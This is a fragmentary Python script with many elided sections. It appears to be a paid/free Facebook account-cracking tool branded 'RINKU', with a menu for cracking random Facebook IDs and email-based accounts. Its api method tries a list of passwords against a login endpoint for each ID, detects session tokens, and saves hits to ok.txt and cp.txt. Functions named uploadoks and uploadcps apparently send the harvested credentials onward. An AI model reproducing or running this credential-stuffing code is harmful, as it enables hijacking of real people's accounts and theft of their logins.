...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/RINKUAliOfficail")
...
\x1b[0;91m\x1b[1;43m                  SYC0 TH3 BR4ND :)                 \x1b[0m""")
		...
		print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s(GET APROVAL FIRST) V1"%(G,R,G,Y,B))
		print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s(GET APROVAL FIRST) V2"%(G,R,G,Y,B))
		print("%s [%s4%s]%s CRACK RANDOM FB ID 2004 %s(PAID) V3"%(G,R,G,Y,B))
		print("%s [%s5%s]%s CRACK FROM EMAILS %s(PAID)"%(G,R,G,Y,B))
		print("%s [%s6%s]%s CRACK RANDOM FB ID Custom %s(PAID) V1"%(G,R,G,Y,B))
		print(GET)
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [THE RINKU] : %s/%s -> \033[0;92m [ RINKU-OK:%s ]- \033[0;94m[RINKU-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [RINKU-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;94m[RINKU-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [RINKU-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
